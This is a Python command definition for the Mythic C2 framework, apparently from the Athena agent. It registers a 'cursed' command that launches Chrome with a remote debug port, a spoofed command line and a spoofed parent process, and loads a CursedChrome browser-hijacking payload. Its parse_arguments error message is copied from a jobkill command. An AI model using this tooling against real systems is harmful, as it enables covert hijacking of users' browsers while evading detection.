from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *

from .athena_utils import message_converter


class CursedArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        self.args = [            
            CommandParameter(
                name="debug_port",
                cli_name="debug_port",
                display_name="Debug Port",
                description="The port to use for browser debugging",
                type=ParameterType.String,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        ui_position=0,
                        group_name="Default" # Many Args
                    ),
                ],
            ),
            CommandParameter(
                name="target",
                type=ParameterType.String,
                description="The target to set if using the default payload",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=False,
                        name="Default",
                    ),
                ]
            ),
            CommandParameter(
                name="payload",
                type=ParameterType.File,
                description="Custom payloaed to use with CursedChrome",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=2,
                        required=False,
                        name="Default",
                    ),
                ]
            ),
            CommandParameter(
                name="cmdline",
                type=ParameterType.String,
                description="Spoofed cmdline to set when spawning browser",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=3,
                        required=False,
                        name="Default",
                    ),
                ]
            ),            
            CommandParameter(
                name="parent",
                type=ParameterType.Number,
                description="The paernt process to spoof",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=4,
                        required=False,
                        name="Default",
                    ),
                ]
            ),            
            CommandParameter(
                name="path",
                type=ParameterType.File,
                description="Override the default paths for chrome.exe",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=5,
                        required=False,
                        name="Default",
                    ),
                ]
            ),
            
            ]

    async def parse_arguments(self):
        if len(self.command_line.strip()) == 0:
            raise Exception("You must specify a task id for use with jobkill.\n\tUsage: {}".format(JobKillCommand.help_cmd))
        pass


class CursedCommand(CommandBase):
    cmd = "cursed"
    needs_admin = False
    help_cmd = """
    cursed [-path C:\Users\checkymander\chrome] [-parent 1234] [-cmdline "nothing to see here"] [-target ws://127.0.0.1:1234] [-debug_port 9222]"""
    description = "Initiate CursedChrome based tasking."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@checkymander"
    argument_class = CursedArguments
    attackmapping = ["T1059"]
    attributes = CommandAttributes(
        load_only=False,
        builtin=True
    )
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        return response
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if "message" in response:
            user_output = response["message"]
            await MythicRPC().execute("create_output", task_id=task.Task.ID, output=message_converter.translateAthenaMessage(user_output))

        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
